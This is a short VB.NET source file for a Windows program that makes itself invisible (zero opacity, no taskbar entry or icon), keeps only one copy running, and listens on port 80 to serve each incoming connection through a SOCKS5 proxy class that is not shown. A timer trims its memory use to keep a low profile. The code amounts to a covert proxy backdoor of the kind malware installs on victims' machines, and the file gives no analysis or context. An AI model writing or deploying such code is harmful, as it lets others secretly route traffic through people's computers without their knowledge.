﻿Imports System.IO
Imports System.Net
Imports System.Text
Imports System.Threading
Imports System.Net.Sockets
Imports System.Collections.Generic

Public Class Form1
    Private Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim RunningProcesses As Process() = Process.GetProcessesByName(Process.GetCurrentProcess.ProcessName)
        If (RunningProcesses.Length > 1) Then
            GC.Collect()
            End
        End If
        Me.Hide()
        Me.Opacity = 0
        Me.Visible = False
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Timer1.Start()
        Dim server As New TcpListener(80)
        server.Start()
        While True
            Dim client As TcpClient = server.AcceptTcpClient()
            Dim S As New Socks5(client)
            Dim T As New Thread(New ThreadStart(AddressOf S.Work))
            T.Start()
        End While
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        GC.Collect()
        GC.WaitForPendingFinalizers()
        If (Environment.OSVersion.Platform = PlatformID.Win32NT) Then SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
    End Sub
End Class
